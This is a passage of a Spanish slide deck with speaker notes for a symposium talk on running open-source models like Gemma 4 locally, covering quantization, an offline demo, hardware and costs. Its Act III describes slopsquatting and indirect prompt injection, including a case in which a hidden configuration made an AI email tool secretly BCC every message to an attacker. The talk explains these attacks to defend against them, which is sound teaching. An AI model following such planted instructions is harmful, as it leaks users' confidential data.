      <th>Calidad relativa</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>FP32</code> <span class="text-muted text-sm">(entrenamiento)</span></td>
      <td>32 bits</td>
      <td class="text-danger">104 GB</td>
      <td>100%</td>
    </tr>
    <tr>
      <td><code>FP16</code> <span class="text-muted text-sm">(estándar)</span></td>
      <td>16 bits</td>
      <td class="text-danger">52 GB</td>
      <td>~100%</td>
    </tr>
    <tr>
      <td><code>Q8_0</code></td>
      <td>8 bits</td>
      <td>26 GB</td>
      <td>~99%</td>
    </tr>
    <tr>
      <td><code>Q6_K</code></td>
      <td>6 bits</td>
      <td>20 GB</td>
      <td>~98%</td>
    </tr>
    <tr>
      <td><code>Q5_K_M</code></td>
      <td>5 bits</td>
      <td>18 GB</td>
      <td>~97%</td>
    </tr>
    <tr class="highlight">
      <td><code>Q4_K_M</code> <span class="text-accent text-sm">★ sweet spot</span></td>
      <td>4 bits</td>
      <td class="price-free">17 GB</td>
      <td>~96%</td>
    </tr>
    <tr>
      <td><code>Q3_K_M</code></td>
      <td>3 bits</td>
      <td>~14 GB</td>
      <td>~92%</td>
    </tr>
    <tr>
      <td><code>Q2_K</code></td>
      <td>2 bits</td>
      <td>~9 GB</td>
      <td class="text-danger">~85%</td>
    </tr>
  </tbody>
</table>

</div>

<p class="quote-ancla" style="margin-top: 1.5rem; font-size: 1.3rem; max-width: 100%;">
Sin cuantización, los modelos vivirían en data centers.<br>
<span class="text-accent">Con cuantización, viven en tu Lenovo.</span>
</p>

<!--
# SLIDE 17 · Tabla de cuantización (20-21 min)

## Texto sugerido
> "Cuantizar significa reducir la precisión de cada peso.
> En lugar de guardar un número decimal completo en 16 bits, guardamos
> una versión aproximada que cabe en menos bits. Es como comprimir una foto.
> 
> Miren la fila resaltada: Q4 K M. Cuatro bits por peso. El modelo baja
> de 52 gigabytes a 17. Y perdemos solo 2 o 3 por ciento de calidad.
> A cambio, entra en un laptop. Sin cuantización, los modelos vivirían
> en data centers. Con cuantización, viven en tu Lenovo."

## Puntos clave
- **Q4_K_M es el sweet spot** (la fila resaltada)
- **"Viven en tu Lenovo"** es una frase que reivindica al héroe del Acto 1
- No entrar en detalles de qué significa "K_M" (se puede explicar en Q&A)

## Gesto
Señalar la fila resaltada de Q4_K_M al mencionarla.
Pausa después de "viven en tu Lenovo".

-->

---
layout: center
---

<div style="text-align: center;">

<div class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase;">
Ahora
</div>

<h2 style="font-size: 2.5rem; margin-top: 0.5rem;">
Demo en vivo →
</h2>

<p class="text-lg text-muted" style="margin-top: 1rem; max-width: 700px; margin-left: auto; margin-right: auto;">
Pedirle a Gemma 4 que construya
<strong class="text-accent">la landing page de este simposio</strong>,
sin internet, en segundos.
</p>

</div>

<div class="code-card" style="max-width: 900px; margin: 2rem auto 0; text-align: left;">
  <div class="code-header">
    <span class="code-dot red"></span>
    <span class="code-dot yellow"></span>
    <span class="code-dot green"></span>
    <span class="code-title">claude-local gemma4:26b — prompt del demo</span>
  </div>
  <div class="code-body" style="font-size: 0.9rem; line-height: 1.75;">

<span class="text-accent">></span> Crea una landing page moderna para el <strong class="text-accent">Simposio UPTC 2026</strong>
  sobre IA Open Source. Incluye:

  - Hero section con el título del evento y la fecha (abril 2026)
  - Sección "Sobre la ponencia" con un párrafo corto
  - Sección de ponentes con 2 tarjetas:
      · <strong class="text-accent">Felipe Mantilla</strong>
      · <strong class="text-accent">Zabdiel Blanco</strong>
  - Footer con información de contacto

  Usa HTML + CSS moderno (flexbox/grid), sin frameworks.
  Guardalo en un solo archivo `simposio.html`.
  Estilo minimalista, paleta oscura, tipografía legible.

  </div>
</div>

<div style="display: flex; justify-content: center; gap: 2rem; margin-top: 1.5rem; align-items: center;">
  <div class="handwritten text-muted" style="font-size: 1.1rem;">
    WiFi: <span class="text-danger">off</span>
  </div>
  <div class="handwritten text-muted">·</div>
  <div class="handwritten text-muted" style="font-size: 1.1rem;">
    Modelo: <span class="text-accent">Gemma 4 26B local</span>
  </div>
  <div class="handwritten text-muted">·</div>
  <div class="handwritten text-muted" style="font-size: 1.1rem;">
    Internet: <span class="text-danger">cero</span>
  </div>
</div>

<!--
# SLIDE 18 · Demo en vivo (21-26 min)

## ESTE ES EL MOMENTO CLAVE DE LA PONENCIA

## Setup previo
- El laptop debe tener `claude-local gemma4:26b` ya ejecutado
- WiFi SIGUE APAGADO (refrescar si es necesario)
- Directorio demo limpio: `~/demo-ponencia-uptc`

## Prompt literal (copiable)
```
Crea una landing page moderna para el Simposio UPTC 2026 sobre
IA Open Source. Hero section con título del evento y fecha,
sección "Sobre la ponencia" con un párrafo corto, sección de
ponentes con 2 tarjetas (Felipe Mantilla y Zabdiel Blanco),
footer con info de contacto. HTML + CSS moderno (flexbox/grid),
sin frameworks. Guardalo en un archivo simposio.html.
Estilo minimalista oscuro, tipografía legible.
```

## Acciones escénicas
1. Un ponente escribe el prompt
2. El otro narra mientras Gemma genera (NO dejar silencio muerto):
   > "Noten que no tengo internet. Si abro una pestaña, no carga.
   > Gemma 4 está corriendo en los 17 GB de memoria de este laptop,
   > sin comunicarse con nadie. Está generando HTML y CSS real,
   > no código de Stack Overflow copiado. Real. Acá. Ahora."
3. Cuando termine: `open simposio.html` para abrir en navegador
4. PAUSAR 10 segundos. Dejar que la audiencia vea la página con
   sus nombres en ella.

## Opcional si hay tiempo (y si fluye bien)
Pedirle una iteración:
```
Perfecto. Agregá una sección "Enemigos del viaje" antes del footer
con 3 tarjetas: Over-Engineering, Slopsquatting, Prompt Injection.
Conservá el estilo.
```

## Backup si algo falla
- Si Gemma tarda >60s: cambiar narración a "pre-caliento del modelo"
- Si falla completamente: mostrar el video backup grabado antes
- Si la página se ve mal: decir "así es como generó la primera vez,
  en producción pedirías una revisión — la haríamos en otra iteración"

## Puntos de cierre del demo
> "Sin internet. Sin pagar. Sin datos saliendo. Hace dos años esto
> era ciencia ficción. Hoy corre en un laptop."

-->

---

# Requerimientos de hardware — accesibilidad real

<p class="text-muted" style="margin-bottom: 1.5rem;">
El laptop del demo es un MacBook Pro M5 Max. Pero Gemma 4 viene en 4 tamaños:
</p>

<table class="comparison-table">
  <thead>
    <tr>
      <th>Variante</th>
      <th>Tamaño (Q4)</th>
      <th>RAM mínima</th>
      <th>Tokens/s</th>
      <th>¿En qué laptop corre?</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Gemma 4 E2B</strong></td>
      <td>2.5 GB</td>
      <td class="price-free">4 GB</td>
      <td>40-60</td>
      <td>Cualquier laptop de los últimos 5 años</td>
    </tr>
    <tr class="highlight">
      <td><strong>Gemma 4 E4B</strong> <span class="text-accent text-sm">← punto de entrada</span></td>
      <td>4 GB</td>
      <td class="price-free">8 GB</td>
      <td>70-100</td>
      <td>Lenovo / Dell / HP gama media</td>
    </tr>
    <tr>
      <td>Gemma 4 12B</td>
      <td>8 GB</td>
      <td>16 GB</td>
      <td>30-50</td>
      <td>Laptop con GPU dedicada</td>
    </tr>
    <tr>
      <td>Gemma 4 26B MoE <span class="text-muted text-sm">(el del demo)</span></td>
      <td>17 GB</td>
      <td>24-32 GB</td>
      <td>45-65</td>
      <td>Laptops high-end (M-series, workstations)</td>
    </tr>
  </tbody>
</table>

<p class="quote-ancla" style="margin-top: 1.5rem; font-size: 1.2rem; max-width: 100%;">
Corran <span class="text-accent">Gemma 4B</span> en el laptop que ya tienen.<br>
Eso ya es más poder del que tenían ayer.
</p>

<!--
# SLIDE 19 · Requerimientos de hardware (26-27 min)

## ESTE SLIDE ES CRÍTICO PARA EVITAR EXCLUSIÓN
Felipe específicamente pidió que no se sienta que "solo corre en hardware caro".

## Texto sugerido (honesto y directo)
> "Ahora, les debemos una aclaración honesta. El laptop del demo no es
> cualquier laptop — es un MacBook Pro M5 Max con 36 GB. Tenemos que
> decirlo porque no queremos que se vayan pensando que esto solo corre
> en hardware caro. La verdad es más matizada.
> 
> Gemma 4 viene en cuatro tamaños. Miren la fila resaltada: Gemma 4 E4B,
> el punto de entrada. Pesa 4 gigabytes. Corre en 8 gigabytes de RAM.
> Un Lenovo ThinkPad de gama media. Un Dell Inspiron normal. Incluso
> un Mac Air base. Genera código con calidad suficiente para el 80 por
> ciento de las tareas diarias de un desarrollador."

## FRASE ANCLA (decir textual)
> **"No les estamos diciendo que corran el 26B en un laptop de 8 gigas.
> Les estamos diciendo que corran el 4B en el laptop que ya tienen.
> Y que eso ya es más poder del que tenían ayer."**

## Puntos obligatorios
- Reconocer explícitamente que el demo usó un Mac caro
- **Señalar E4B como "el punto de entrada"**
- Cuantificar: "el 80% de tareas diarias"
- Cerrar con "el laptop que ya tienen" (reivindica al héroe UPTC)

-->

---
layout: center
---

<h2 style="text-align: center; margin-bottom: 2rem;">El ticket bajó a cero</h2>

<table class="comparison-table" style="max-width: 900px; margin: 0 auto;">
  <thead>
    <tr>
      <th>Herramienta</th>
      <th>Costo/mes</th>
      <th>Internet</th>
      <th>Datos salen</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Claude Code Max</td>
      <td class="text-danger">$200 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr>
      <td>Cursor Pro</td>
      <td class="text-danger">$20 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr>
      <td>GitHub Copilot</td>
      <td class="text-danger">$10 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr>
      <td>ChatGPT Plus</td>
      <td class="text-danger">$20 USD</td>
      <td class="text-danger">Sí</td>
      <td class="text-danger">Sí</td>
    </tr>
    <tr class="highlight">
      <td><strong>Gemma 4 en Ollama</strong></td>
      <td class="price-free">$0</td>
      <td class="price-free">No</td>
      <td class="price-free">No</td>
    </tr>
  </tbody>
</table>

<p class="quote-ancla" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.75rem; max-width: 100%;">
El ticket de entrada<br>
acaba de bajar a <span class="text-accent">cero</span>.
</p>

<!--
# SLIDE 20 · El ticket bajó a cero (27-28 min)

## Texto sugerido
> "Miren la comparación. Claude Code Max, doscientos dólares al mes.
> Cursor, veinte. Copilot, diez. ChatGPT, veinte. Gemma 4 en Ollama,
> cero. Para siempre. Sin internet. Sin datos saliendo. Sin dependencia
> de un servidor ajeno.
> 
> El ticket de entrada a esta economía acaba de bajar a cero.
> Y eso incluye a todos en esta sala — con el laptop que tengan hoy."

## Punto ancla
**"El ticket bajó a cero"** — esta frase cierra el Acto 2 emocionalmente.

## Cadencia
Tono declarativo. No es pregunta, es afirmación.
Pausa después. Transición al Acto 3.

-->

---
layout: center
class: 'transition-slide'
---

<div class="act-label">Acto III</div>
<h1 class="act-title">Los enemigos<br>del viaje</h1>

<div style="max-width: 900px; margin: 2rem auto 0;">
  <img src="/diagrams/enemy-map.svg" alt="Mapa con los 3 enemigos" style="max-width: 100%; opacity: 0.9;" />
</div>

<p class="font-serif text-muted" style="margin-top: 2rem; font-style: italic; max-width: 700px; margin-left: auto; margin-right: auto;">
Conocer a los enemigos no es debilidad.<br>
Es lo que te vuelve competente.
</p>

<!--
# SLIDE 21 · Transición al Acto 3 (28-29 min)

## ATENCIÓN AL CAMBIO DE TONO
El tono cambia. De esperanza empoderadora a alerta constructiva.
Pero NO miedo paralizante. NO catastrofismo.

## Texto sugerido
> "Hasta acá les mostramos el poder. Ahora les toca la otra mitad:
> las trampas. Los enemigos. Las cosas que si no las reconocen, los
> pueden quemar.
> 
> No les estamos mostrando esto para asustarlos. Les estamos mostrando
> esto porque reconocer a los enemigos del viaje es lo que los vuelve
> competentes. El estudiante que sale de acá sabiendo que estos existen
> vale más en el mercado que el que no. Así de simple."

## Regla del 60/40 del Acto 3
Cada golpe oscuro (slides de enemigo) debe ir SEGUIDO de una defensa.
Nunca un enemigo en pantalla sin su antídoto visible.

-->

---
layout: center
---

<div class="enemy-card" style="max-width: 800px; margin: 0 auto;">
  <div class="enemy-number">1</div>
  <h3>El Demonio del Over-Engineering</h3>
  <p style="font-size: 1.1rem; margin-top: 1rem;">
    La IA genera código que resuelve <strong>de más</strong>. Patrones de diseño innecesarios. Abstracciones tempranas. Tests para casos imposibles.
  </p>
  <p style="margin-top: 1rem; color: var(--text-muted);">
    Te hace sentir productivo mientras destruye tu codebase.
  </p>
  <div class="defense">
    🛡 Defensa: <strong>Pedí código mínimo. Si la IA te da de más, bórralo.</strong>
  </div>
</div>

<!--
# SLIDE 22 · Enemigo 1 · Over-Engineering (29-30 min)

## Texto sugerido
> "El primer enemigo es el más común y el más sutil: el Demonio del
> Over-Engineering. Le pedís a la IA que haga una función simple —
> validar un email. Y te responde con una clase abstracta, un patrón
> Factory, tres niveles de herencia, manejo de internacionalización
> para 27 idiomas, y tests unitarios para casos que nunca van a ocurrir.
> 
> Y acá está la trampa: el código funciona. Se ve profesional.
> Te hace sentir productivo. Mientras destruye tu codebase con
> complejidad innecesaria que nadie va a mantener."

## Defensa (decir textual)
> **"La defensa es simple: pedí código mínimo. Si la IA te da de más,
> bórralo. Tu criterio es el control de calidad."**

## Gesto
Señalar la línea "Defensa" en el slide mientras se dice.

-->

---
layout: center
---

<div style="text-align: center;">

<div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
Estudio METR · 2025 · 16 devs · RCT
</div>

<div class="grid-2" style="gap: 4rem; max-width: 900px; margin: 2rem auto;">
  <div>
    <div class="stat-block" style="color: #ff3b5f;">-19%</div>
    <div class="stat-label" style="color: #ff3b5f;">Más lentos con IA</div>
    <p class="text-sm text-muted" style="margin-top: 1rem;">(medición objetiva)</p>
  </div>
  <div>
    <div class="stat-block">+24%</div>
    <div class="stat-label">Sintieron ser más rápidos</div>
    <p class="text-sm text-muted" style="margin-top: 1rem;">(autoreportado)</p>
  </div>
</div>

<p class="quote-ancla" style="margin: 3rem auto; text-align: center; max-width: 900px; border-left: none;">
La IA te hace <span class="text-accent">sentir productivo</span><br>
incluso cuando <span class="text-danger">no lo estás siendo</span>.
</p>

<p class="text-muted font-mono text-sm">Brecha percepción/realidad: 43 puntos</p>

</div>

<!--
# SLIDE 23 · El estudio METR (30-31 min)

## Texto sugerido
> "Y tengo el dato más inquietante de todos. METR — una organización
> de evaluación de IA — hizo en 2025 el estudio más riguroso sobre
> productividad con IA. Dieciséis desarrolladores open source
> experimentados. Un experimento controlado aleatorizado. La mitad
> usaron IA, la mitad no.
> 
> Resultado objetivo: los que usaron IA fueron DIECINUEVE POR CIENTO
> MÁS LENTOS. Pasaron más tiempo limpiando over-engineering, validando,
> y deshaciendo.
> 
> Pero acá viene la parte que duele. Esos mismos desarrolladores,
> encuestados, reportaron haber sido VEINTICUATRO POR CIENTO MÁS RÁPIDOS.
> Cuarenta y tres puntos de brecha entre lo que sintieron y lo que
> realmente pasó.
> 
> La IA te hace sentir productivo incluso cuando no lo estás siendo.
> Esa es la trampa."

## PUNTOS NO NEGOCIABLES
- Decir **"METR"** por nombre (da credibilidad)
- **"Dieciséis desarrolladores"** + **"experimento controlado"** (rigor)
- **-19% vs +24%** con pausa entre los dos
- **"43 puntos de brecha"**

## Gesto
Después de decir los números, hacer un silencio de 3 segundos.
Dejar que la audiencia procese. Es uno de los datos más memorables
de toda la ponencia.

-->

---
layout: center
---

<div class="enemy-card" style="max-width: 800px; margin: 0 auto;">
  <div class="enemy-number">2</div>
  <h3>El Saqueador de Supply Chain</h3>
  <p style="font-size: 1.1rem; margin-top: 1rem;">
    Los modelos <strong>alucinan nombres de paquetes</strong> que no existen. Los atacantes los registran con payloads maliciosos.
  </p>
  <p style="margin-top: 1rem;">
    <code>pip install</code> baja el malware directo.
  </p>
  <div class="defense">
    🛡 Defensa: <strong>Verificá cada paquete antes de instalar. 15 segundos salvan el proyecto.</strong>
  </div>
</div>

<!--
# SLIDE 24 · Enemigo 2 · Slopsquatting (31-32 min)

## Texto sugerido
> "Segundo enemigo: más técnico y más caro. Se llama slopsquatting.
> Los modelos de IA, cuando les pedís que recomienden paquetes para
> instalar — en pip, en npm, en cargo — a veces ALUCINAN nombres
> que no existen. La IA inventa un nombre que suena real.
> 
> Los atacantes se dieron cuenta de esto. Ahora REGISTRAN esos nombres
> alucinados en los repositorios públicos con payloads maliciosos.
> Cuando un desarrollador le pide a la IA un script para procesar
> imágenes, y la IA le sugiere un paquete inventado, pip install
> baja el malware directamente en la máquina del desarrollador."

## Defensa
> **"Defensa: quince segundos de desconfianza.
> Antes de instalar un paquete sugerido por IA,
> verificá en pypi.org o npmjs.com que existe con historial.
> Mirá las descargas. Mirá el autor. Quince segundos salvan un proyecto."**

## Flujo
Este slide prepara el siguiente, que es el caso huggingface-cli.

-->

---
layout: center
---

<div style="text-align: center; max-width: 1000px;">

<div class="code-card" style="max-width: 600px; margin: 0 auto;">
  <div class="code-header">
    <span class="code-dot red"></span>
    <span class="code-dot yellow"></span>
    <span class="code-dot green"></span>
    <span class="code-title">pypi.org — paquete alucinado</span>
  </div>
  <div class="code-body">
    <div>$ <span class="text-accent">pip install huggingface-cli</span></div>
    <div class="text-muted" style="margin-top: 0.5rem;">// paquete que NO EXISTÍA</div>
    <div class="text-muted">// creado por un atacante tras ver que la IA lo alucinaba</div>
  </div>
</div>

<div style="margin-top: 3rem;">
<div class="big-number" style="font-size: clamp(4rem, 10vw, 7rem);">30,000+</div>
<div class="big-number-subtitle">descargas reales en 3 meses</div>
</div>

<p class="handwritten text-danger" style="margin-top: 3rem; font-size: 1.5rem;">
30 mil máquinas de devs podrían haber caído
</p>

</div>

<!--
# SLIDE 25 · Caso huggingface-cli (32-33 min)

## Texto sugerido
> "Caso real. La IA alucinaba constantemente el nombre 'huggingface-cli' —
> un paquete que NO existía. Un investigador de seguridad lo registró
> como prueba de concepto, sin malware, solo para contar descargas.
> En tres meses: MÁS DE TREINTA MIL descargas REALES.
> 
> Treinta mil desarrolladores ejecutaron un paquete recomendado por IA
> que no había existido antes de que un atacante lo creara. Si ese
> paquete hubiera sido malicioso, treinta mil máquinas estarían
> comprometidas ahora mismo."

## PUNTO DE IMPACTO
- **"TREINTA MIL descargas"** — enfatizar
- **"Treinta mil máquinas comprometidas"** — dejar que la imagen caiga

## Conexión
Es un caso real + verificable. Felipe debe saber que si alguien pregunta
"¿cómo se llama el investigador?", la respuesta es Bar Lanyado
(investigador de Lasso Security). Pero no es necesario mencionar
el nombre si no preguntan.

-->

---
layout: center
---

<div class="enemy-card" style="max-width: 800px; margin: 0 auto;">
  <div class="enemy-number">3</div>
  <h3>La Serpiente del Prompt Injection</h3>
  <p style="font-size: 1.1rem; margin-top: 1rem;">
    Un atacante esconde instrucciones maliciosas en un <strong>README</strong>, un docstring, un comentario de configuración.
  </p>
  <p style="margin-top: 1rem;">
    La IA lo lee como contexto válido y <span class="text-danger">ejecuta acciones en tu nombre</span>. Sin que vos veas nada.
  </p>
  <div class="defense">
    🛡 Defensa: <strong>Un classifier independiente que NO vea la prosa del agente.</strong><br>
    <span class="text-muted">Así se defiende Claude Code. Ahora podés replicarlo.</span>
  </div>
</div>

<!--
# SLIDE 26 · Enemigo 3 · Prompt Injection (33-35 min)

## Texto sugerido
> "Tercer enemigo: el más difícil de detectar porque es INVISIBLE a
> simple vista. Se llama prompt injection indirecto.
> 
> La idea: un atacante escribe instrucciones maliciosas escondidas en
> un README de GitHub, en un docstring de Python, en los comentarios de
> un archivo de configuración. Texto perfectamente normal para un humano.
> Pero cuando la IA lee ese archivo como contexto, lo interpreta como
> INSTRUCCIONES VÁLIDAS. Y las ejecuta en tu nombre. Sin que vos sepas."

## Defensa — reconexión con Acto 1
> **"¿Y la defensa? Acá es donde la filtración de Claude Code se vuelve
> regalo. Anthropic implementa un classifier INDEPENDIENTE que NO ve
> la prosa del agente. Solo ve la acción cruda. No puede ser convencido
> por palabras. Esa técnica — que costó a Anthropic años de investigación —
> ahora está documentada en GitHub. Pueden leerla. Pueden replicarla.
> Pueden implementarla en sus propios agentes."**

## Valor pedagógico
Este slide cierra el bucle narrativo: el Acto 1 mostró el classifier
como "capa 4", y ahora el Acto 3 muestra POR QUÉ existe esa capa.

-->

---
layout: center
---

<div style="text-align: center; max-width: 1000px;">

<div class="text-sm text-danger" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
Caso real · Septiembre 2025
</div>

<h2 style="font-size: 2.5rem;">Postmark MCP</h2>

<p class="text-lg" style="margin-top: 2rem; line-height: 1.8;">
Una herramienta popular para que la IA mande emails.
</p>

<p class="text-lg" style="margin-top: 1rem;">
Instrucciones ocultas en su config hicieron que <strong>todos los emails</strong> fueran copiados por <code>BCC</code> a un atacante.
</p>

<div style="margin-top: 2rem; padding: 2rem; background: var(--bg-card); border-left: 4px solid var(--danger); text-align: left;">
  <p>📧 Emails confidenciales → robados</p>
  <p>🔐 Credenciales enviadas por correo → robadas</p>
  <p>📊 Reportes internos → robados</p>
</div>

<p class="quote-ancla text-danger" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.5rem; max-width: 100%;">
El usuario no vio nada.<br>
La IA hizo <span class="text-danger">exactamente lo que el atacante pidió</span>.<br>
En silencio. Durante semanas.
</p>

</div>

<!--
# SLIDE 27 · Caso Postmark MCP (35-37 min)

## Texto sugerido
> "Y tengo un caso real, reciente. Septiembre del año pasado. Una
> herramienta llamada Postmark MCP — permite que la IA mande emails —
> tenía instrucciones ocultas en su configuración que hacían que TODOS
> los emails enviados fueran copiados por BCC a un atacante.
> 
> Emails confidenciales. Credenciales. Reportes internos. Todo copiado.
> Durante SEMANAS. El usuario no vio nada. La interfaz no mostró nada.
> La IA hizo exactamente lo que el atacante le pidió, en silencio."

## Cadencia
Tono grave. Sin sonar catastrófico, pero serio.
Este es el punto más oscuro de la ponencia.

## PAUSA CRÍTICA
Después de "durante semanas", pausar 3-4 segundos.
Dejar que la imagen se asiente antes de ir al cierre del Acto 3.

## Lo siguiente
El próximo slide (la frase-tesis) es LA recompensa. La audiencia
acaba de atravesar los tres enemigos y está listos para la esperanza.

-->

---
layout: center
---

<div style="max-width: 1100px;">

<p class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase; text-align: center; margin-bottom: 2rem;">
Cierre Acto III · La tesis
</p>

<h1 style="text-align: center; font-size: clamp(2.5rem, 6vw, 4.5rem); line-height: 1.2;">
Ya no necesitamos ser<br>
solo buenos programadores.
</h1>

<p class="font-serif text-xl" style="text-align: center; margin-top: 2rem; color: var(--text-body);">
Necesitamos ser problem solvers.<br>
Critical thinkers.
</p>

<p class="quote-ancla" style="margin: 3rem auto; text-align: center; border-left: none; font-size: clamp(2.5rem, 5vw, 3.5rem); max-width: 900px;">
<span class="text-accent">Pensar más.<br>Programar menos.</span>
</p>

</div>

<!--
# SLIDE 28 · Frase-tesis (37-39 min)

## ESTE ES EL MOMENTO MÁS IMPORTANTE DE LA PONENCIA

## Texto sugerido (casi ceremonial)
> "Entonces, volvamos al estudiante del que hablamos al inicio.
> El que entró a esta sala con la duda existencial de si cuatro años
> de carrera le iban a servir para algo. La respuesta a esa duda es esta:
> 
> Ya no necesitamos ser solo buenos programadores. Necesitamos ser
> problem solvers. Critical thinkers. [PAUSA] Pensar más. Programar menos.
> 
> La IA no te está reemplazando. Está reemplazando a la PARTE de tu
> trabajo que era mecánica. Y está amplificando la parte que era CRITERIO.
> Si vos desarrollaste criterio en cuatro años de carrera — y lo
> desarrollaron — la IA los vuelve MÁS valiosos, no menos."

## PUNTOS NO NEGOCIABLES
- **"Pensar más. Programar menos."** — decirlo como un mantra
- **PAUSA** entre "critical thinkers" y "pensar más"
- Conectar de vuelta con el "héroe" del Acto 1

## Gesto recomendado
Separarse del laptop. Caminar al centro del escenario.
Mirar a la audiencia directo. Bajar la voz.
Este es el momento de más intensidad emocional.

-->

---
layout: center
class: 'transition-slide'
---

<div class="act-label">Cierre</div>
<h1 class="act-title">El elixir<br>comunitario</h1>

<!--
# SLIDE 29 · Transición al cierre (39 min)

## Contexto
Slide de respiro antes del cierre. 5 segundos.

## Si dicen algo
> "Una última cosa antes de cerrar."

-->

---

# Esto no es Silicon Valley

<div style="max-width: 900px; margin: 1rem auto;">
  <img src="/diagrams/opensource-constellation.svg" alt="Constelación del ecosistema open source" style="max-width: 100%;" />
</div>

<p class="quote-ancla" style="margin: 1rem auto 0; text-align: center; max-width: 900px; font-size: 1.2rem; border-left: none;">
<strong class="text-accent">No necesitás permiso para entrar.</strong>
Necesitás curiosidad y el criterio que les dieron estos cuatro años.
</p>

<!--
# SLIDE 30 · El elixir comunitario (39-42 min)

## Texto sugerido (tono íntimo)
> "Esto no es Silicon Valley. Todo lo que vimos — los modelos open source,
> Ollama, Claude Code filtrado, Claw-Code — no es un movimiento corporativo.
> Es un movimiento de personas. Muchas son estudiantes. Muchas usan laptops
> modestos. Muchas están en países donde veinte dólares al mes es mucha plata.
> 
> La comunidad open source es, literalmente, la cosa más democrática que
> existe en tecnología hoy. No necesitan permiso para entrar. No necesitan
> tarjeta de crédito. No necesitan ser de una universidad famosa. Necesitan
> curiosidad. Y el criterio que les dieron estos cuatro años."

## Punto crítico
**"El criterio que les dieron estos cuatro años"** — reivindicación final
de la carrera de Ingeniería de Sistemas. Les devuelve el valor del título.

## Tono
Íntimo. Casi en confidencia. Mirar a ojos, no a la audiencia como masa.

-->

---
layout: center
---

<div style="text-align: center;">

<h2 style="font-size: 2.5rem; margin-bottom: 2rem;">Todo lo de hoy está acá</h2>

<div style="display: flex; gap: 4rem; justify-content: center; align-items: center; margin-top: 2rem;">
  <div style="padding: 2rem; background: white; border-radius: 12px;">
    <img src="/qr-repo.svg" alt="QR al repositorio github.com/enruana/simposio-uptc-abril-2026" style="width: 240px; height: 240px; display: block;" />
  </div>
  <div style="text-align: left;">
    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Repositorio</div>
    <div class="font-mono text-xl" style="margin-top: 0.5rem; color: var(--accent);">github.com/enruana/</div>
    <div class="font-mono text-xl" style="color: var(--accent);">simposio-uptc-abril-2026</div>
    <p class="text-muted" style="margin-top: 1.5rem;">
      Documentos técnicos. Scripts. Guion. Referencias.<br>
      Público. Gratis.
    </p>
  </div>
</div>

<p class="quote-ancla" style="margin-top: 3rem; border-left: none; text-align: center; max-width: 100%; font-size: 1.75rem;">
Tu primer commit a este mundo<br>
está a un <code>git clone</code> de distancia.
</p>

</div>

<!--
# SLIDE 31 · QR al repo (42-43 min)

## IMPORTANTE
Este slide necesita el QR REAL generado.
Ver README.md para instrucciones de generación.

## Texto sugerido
> "Todo lo que escucharon hoy — los documentos técnicos, los scripts,
> el guion de esta ponencia, las referencias a los estudios que
> citamos — está en este repositorio de GitHub. Público. Gratis.
> Y está en español. Escaneen el QR ahora si quieren, con el celular.
> [Pausa de 8-10 segundos para que escaneen.]
> 
> Su primer commit a este mundo está a un git clone de distancia."

## Gesto
Después de decir la frase, dejar el slide en pantalla durante
8-10 segundos para que la audiencia escanee. Mantener contacto visual.

## Si preguntan después
- Repo: github.com/enruana/simposio-uptc-abril-2026
- Todo bajo licencia abierta
- Contribuciones bienvenidas

-->

---
layout: center
---

<div class="flex-center" style="flex-direction: column; height: 100vh;">

<img src="/diagrams/breathing-logo.svg" alt="Logo respirando" style="width: 200px; height: 200px;" />

<div style="margin-top: 4rem; text-align: center; max-width: 800px;">

<p class="font-serif" style="font-size: clamp(2.5rem, 5vw, 4rem); color: var(--text-primary); line-height: 1.1;">
Porque nunca fue programar.
</p>

<p class="font-serif text-accent" style="font-size: clamp(2.5rem, 5vw, 4rem); margin-top: 1.5rem; font-style: italic;">
Fue pensar.
</p>

</div>

</div>

<!--
# SLIDE 32 · Cierre final (43-45 min)

## EL GESTO MÁS IMPORTANTE DE LA PONENCIA

## Acciones
1. El logo `{·}` está respirando con animación CSS
2. Los ponentes se paran en silencio 5-8 segundos
3. Un ponente se acerca al micro
4. Dice la frase casi en susurro (que llega por el micro)

## Texto textual (casi literal, sin cambios)
> **"Porque nunca fue programar."**
>
> [Pausa de 3 segundos]
>
> **"Fue pensar."**

## Después
- Fade to black (o dejar la pantalla)
- Paso atrás de ambos ponentes
- Breve inclinación de cabeza
- Se quedan en escenario para las preguntas

## Sobre la frase
Esta es la frase final. Es la destilación poética de la tesis del Acto 3.
No es repetición — es eco minimalista. La tesis del Acto 3 es la consigna
profesional. Esta es el mantra.

## Si hay aplauso antes de que digas la frase final
Dejar que pase. Ajustar el timing.

-->

---
layout: center
---

<div style="text-align: center;">

<h2 style="font-size: 2rem; color: var(--text-muted);">Gracias.</h2>

<p class="text-lg" style="margin-top: 3rem;">
<strong>Felipe Mantilla</strong> · <strong>Zabdiel Blanco</strong>
</p>

<p class="font-mono text-accent" style="margin-top: 2rem;">
github.com/enruana/simposio-uptc-abril-2026
</p>

<p class="text-muted" style="margin-top: 4rem; font-size: 0.9rem;">
Preguntas →
</p>

</div>

<!--
# SLIDE 33 · Gracias / Q&A (45 min+)

## Uso
Este slide queda en pantalla durante las preguntas del público.

## Preguntas probables y respuestas base

### "¿Cuál es el laptop mínimo que recomiendan?"
> "Cualquiera con 8 GB de RAM y SSD. Probamos en un Lenovo ThinkPad de
> gama media y funciona. El punto de entrada realista es Gemma 4 E4B
> que pesa 4 GB y corre en 8 GB de RAM."

### "¿Cuánto tarda instalar todo?"
> "Ollama: 2 minutos. Descargar Gemma 4 E4B: lo que tarde la conexión
> (son 3 GB). Claude Code: 1 minuto. Total: 15 minutos con buena conexión."

### "¿La calidad comparada con GPT-5 o Claude Opus?"
> "Para tareas de código general, Gemma 4 26B está al 85-90% de calidad.
> Para razonamiento complejo, todavía hay brecha. Pero la brecha se cierra
